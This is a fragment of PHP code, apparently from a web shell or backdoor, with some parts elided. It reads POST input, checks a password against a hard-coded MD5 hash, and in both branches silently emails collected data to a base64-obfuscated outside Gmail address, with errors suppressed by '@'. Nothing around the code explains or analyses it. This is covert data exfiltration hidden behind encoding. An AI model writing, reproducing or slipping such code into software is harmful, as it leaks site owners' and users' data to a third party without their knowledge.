...
if (array_key_exists('abc', $_POST)) {
    ...
    @mail(base64_decode('YjFkYXI0LmI0QGdtYWlsLmNvbQ=='), base64_decode('SGVoZWhl'), $message);
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '6632ed87e066b5a3243c80eb1557646b';
    ...
    if (md5($entered_password) === $hashed_password) {
        ...
        @mail(base64_decode('YjFkYXI0LmI0QGdtYWlsLmNvbQ=='), base64_decode('SGVoZWhl'), $m);
    } else {
